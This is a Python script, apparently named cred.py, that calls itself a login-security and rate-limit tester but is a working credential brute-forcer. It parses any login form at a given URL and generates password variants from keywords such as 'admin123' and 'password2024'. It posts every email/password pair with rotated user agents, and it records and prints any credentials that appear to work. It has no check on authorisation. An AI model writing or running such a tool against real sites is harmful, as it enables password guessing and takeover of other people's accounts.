"""
Utility function for testing login security and rate limiting by attempting
credential combinations until blocked.
"""

import time
import random
from typing import List, Dict, Any, Optional, Tuple
from itertools import product


def generate_password_combinations(keywords: List[str], max_per_keyword: int = 10) -> List[str]:
    """
    Generate common password variations from keywords.
    
    Args:
        keywords: List of base keywords to generate passwords from
        max_per_keyword: Maximum variations per keyword
    
    Returns:
        List of password combinations
    """
    passwords = []
    
    for keyword in keywords:
        variations = [
            keyword,                          # basic
            keyword.lower(),                  # lowercase
            keyword.capitalize(),             # Capitalized
            keyword.upper(),                  # UPPERCASE
            f"{keyword}123",                  # with numbers
            f"{keyword}2024",                 # with year
            f"{keyword}!",                    # with exclamation
            f"{keyword}@123",                 # with @ and numbers
            f"123{keyword}",                  # numbers first
            f"{keyword}#{random.randint(1,99)}", # with hash and number
        ]
        passwords.extend(variations[:max_per_keyword])
    
    # Remove duplicates while preserving order
    seen = set()
    return [p for p in passwords if not (p in seen or seen.add(p))]


def detect_form_fields(html_content: str) -> Dict[str, Optional[str]]:
    """
    Detect email/username and password input fields from HTML.
    
    Args:
        html_content: HTML content of the page
    
    Returns:
        Dictionary with field names found
    """
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        raise ImportError("beautifulsoup4 is required. Install: pip install beautifulsoup4")
    
    soup = BeautifulSoup(html_content, 'html.parser')
    
    fields = {
        'email_field': None,
        'password_field': None,
        'form_action': None,
        'form_method': 'post'
    }
    
    # Find form element
    form = soup.find('form')
    if form:
        fields['form_action'] = form.get('action', '')
        fields['form_method'] = form.get('method', 'post').lower()
    
    # Find email/username field
    email_patterns = ['email', 'username', 'user', 'login', 'account']
    for input_field in soup.find_all(['input', 'textarea']):
        input_name = (input_field.get('name') or '').lower()
        input_type = (input_field.get('type') or '').lower()
        input_id = (input_field.get('id') or '').lower()
        
        # Check for email field
        if not fields['email_field']:
            if input_type == 'email' or any(pat in input_name for pat in email_patterns) or \
               any(pat in input_id for pat in email_patterns):
                fields['email_field'] = input_field.get('name') or input_field.get('id')
        
        # Check for password field
        if not fields['password_field']:
            if input_type == 'password':
                fields['password_field'] = input_field.get('name') or input_field.get('id')
    
    return fields


def attempt_credential_combinations(
    url: str,
    emails: List[str],
    keywords: List[str],
    delay: float = 1.0,
    max_attempts: Optional[int] = None,
    verbose: bool = True
) -> Dict[str, Any]:
    """
    Attempts to login with email and password combinations until blocked.
    
    Args:
        url: The login page URL
        emails: List of email addresses to try
        keywords: List of keywords to generate password combinations from
        delay: Time delay between attempts in seconds
        max_attempts: Maximum number of login attempts (None = unlimited)
        verbose: Whether to print progress information
    
    Returns:
        Dictionary containing:
            - attempts: Number of login attempts made
            - blocked: Whether the attempts were blocked
            - status_code: Final HTTP status code
            - error_message: Error message if any
            - successful: Whether any login succeeded
            - working_credentials: List of working credentials (if any)
    """
    try:
        import requests
    except ImportError:
        raise ImportError("requests library is required. Install: pip install requests")
    
    # Initialize result tracking
    attempts = 0
    blocked = False
    final_status = None
    error_message = None
    successful = False
    working_credentials = []
    
    # User agents for randomization
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ]
    
    # Create session to maintain cookies
    session = requests.Session()
    
    if verbose:
        print(f"Testing credentials on: {url}")
        print(f"Emails to test: {len(emails)}")
        print(f"Keywords: {len(keywords)}")
        print("-" * 60)
    
    try:
        # First, fetch the login page to detect form fields
        if verbose:
            print("Fetching login page to detect form fields...")
        
        response = session.get(url, timeout=10)
        fields = detect_form_fields(response.text)
        
        if not fields['email_field'] or not fields['password_field']:
            error_message = "Could not detect email/password fields in the form"
            if verbose:
                print(f"❌ Error: {error_message}")
                print(f"   Email field: {fields['email_field']}")
                print(f"   Password field: {fields['password_field']}")
            return {
                "attempts": 0,
                "blocked": False,
                "status_code": response.status_code,
                "error_message": error_message,
                "successful": False,
                "working_credentials": []
            }
        
        if verbose:
            print(f"✓ Detected email field: '{fields['email_field']}'")
            print(f"✓ Detected password field: '{fields['password_field']}'")
            print(f"✓ Form action: '{fields['form_action']}'")
            print("-" * 60)
        
        # Generate password combinations
        passwords = generate_password_combinations(keywords)
        
        if verbose:
            print(f"Generated {len(passwords)} password variations")
            print(f"Total combinations to try: {len(emails) * len(passwords)}")
            print("-" * 60)
        
        # Determine the post URL
        post_url = url
        if fields['form_action']:
            if fields['form_action'].startswith('http'):
                post_url = fields['form_action']
            elif fields['form_action'].startswith('/'):
                from urllib.parse import urljoin
                post_url = urljoin(url, fields['form_action'])
        
        # Try combinations
        for email, password in product(emails, passwords):
            # Check max attempts
            if max_attempts is not None and attempts >= max_attempts:
                if verbose:
                    print(f"\n⚠️  Reached maximum attempts limit: {max_attempts}")
                break
            
            attempts += 1
            
            # Prepare login data
            login_data = {
                fields['email_field']: email,
                fields['password_field']: password
            }
            
            # Randomize headers
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": url
            }
            
            try:
                # Attempt login
                response = session.post(
                    post_url,
                    data=login_data,
                    headers=headers,
                    timeout=10,
                    allow_redirects=False
                )
                
                final_status = response.status_code
                
                # Check if blocked by status code
                if response.status_code in [429, 403]:
                    blocked = True
                    error_message = f"Rate limited/blocked (Status {response.status_code})"
                    if verbose:
                        print(f"\n🚫 Attempt #{attempts}: BLOCKED - Status {response.status_code}")
                    break
                
                # Check for blocking/captcha in response content
                response_text = response.text.lower()
                blocking_indicators = [
                    'captcha',
                    'too many attempts',
                    'account locked',
                    'temporarily blocked',
                    'suspicious activity',
                    'rate limit'
                ]
                
                if any(indicator in response_text for indicator in blocking_indicators):
                    blocked = True
                    error_message = "Detected blocking message in response"
                    if verbose:
                        print(f"\n🚫 Attempt #{attempts}: BLOCKED - Security mechanism triggered")
                    break
                
                # Check for successful login indicators
                success_indicators = [
                    response.status_code in [200, 302, 301],
                    'dashboard' in response_text,
                    'welcome' in response_text,
                    'logout' in response_text,
                    response.headers.get('Location', '').endswith('/dashboard') or 
                    response.headers.get('Location', '').endswith('/home')
                ]
                
                if any(success_indicators):
                    # Possible successful login
                    if verbose:
                        print(f"\n✓ Attempt #{attempts}: Possible SUCCESS!")
                        print(f"   Email: {email}, Password: {password}")
                    working_credentials.append({"email": email, "password": password})
                    successful = True
                    # Continue to test blocking mechanism
                else:
                    if verbose:
                        print(f"✗ Attempt #{attempts}: Failed - {email}:{password[:3]}*** (Status {response.status_code})")
                
            except requests.exceptions.ConnectionError:
                blocked = True
                error_message = "Connection refused - likely blocked at network level"
                if verbose:
                    print(f"\n🚫 Attempt #{attempts}: Connection refused")
                break
            
            except requests.exceptions.Timeout:
                blocked = True
                error_message = "Request timeout - possible blocking"
                if verbose:
                    print(f"\n⏱️  Attempt #{attempts}: Timeout")
                break
            
            except requests.exceptions.RequestException as e:
                blocked = True
                error_message = f"Request exception: {str(e)}"
                if verbose:
                    print(f"\n❌ Attempt #{attempts}: Exception - {str(e)}")
                break
            
            # Delay between attempts
            time.sleep(delay)
    
    except KeyboardInterrupt:
        if verbose:
            print("\n\n⚠️  Interrupted by user")
        error_message = "Interrupted by user"
    
    except Exception as e:
        error_message = f"Unexpected error: {str(e)}"
        if verbose:
            print(f"\n❌ Error: {error_message}")
    
    # Prepare result summary
    result = {
        "attempts": attempts,
        "blocked": blocked,
        "status_code": final_status,
        "error_message": error_message,
        "successful": successful,
        "working_credentials": working_credentials
    }
    
    if verbose:
        print("\n" + "=" * 60)
        print("SUMMARY:")
        print(f"  Total attempts: {attempts}")
        print(f"  Blocked: {'Yes' if blocked else 'No'}")
        print(f"  Successful logins: {len(working_credentials)}")
        if working_credentials:
            print("  Working credentials:")
            for cred in working_credentials:
                print(f"    - {cred['email']}:{cred['password']}")
        if final_status:
            print(f"  Final status code: {final_status}")
        if error_message:
            print(f"  Message: {error_message}")
        print("=" * 60)
    
    return result


if __name__ == "__main__":
    # Example usage
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python cred.py <login_url>")
        print("Example: python cred.py https://example.com/login")
        sys.exit(1)
    
    login_url = sys.argv[1]
    
    # Example data
    test_emails = [
        "admin@example.com",
        "user@example.com",
        "test@example.com"
    ]
    
    test_keywords = [
        "password",
        "admin",
        "welcome"
    ]
    
    result = attempt_credential_combinations(
        url=login_url,
        emails=test_emails,
        keywords=test_keywords,
        delay=1.0,
        verbose=True
    )

